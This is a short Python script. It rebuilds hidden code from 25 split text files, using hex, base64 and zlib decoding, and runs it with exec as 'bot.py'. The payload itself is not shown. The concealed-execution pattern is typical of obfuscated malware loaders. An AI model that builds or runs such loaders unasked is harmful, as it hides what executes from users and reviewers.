# language: Python 3.11+
import zlib, base64
from pathlib import Path
parts = []
for i in range(25):
    t = Path(__file__).with_name(f"d{i}.txt").read_text(encoding="utf-8")
    if i == 4:
        t = bytes.fromhex(t).decode("utf-8")
    parts.append(t)
raw = "".join(parts)
exec(compile(zlib.decompress(base64.b64decode(raw)), "bot.py", "exec"), globals())
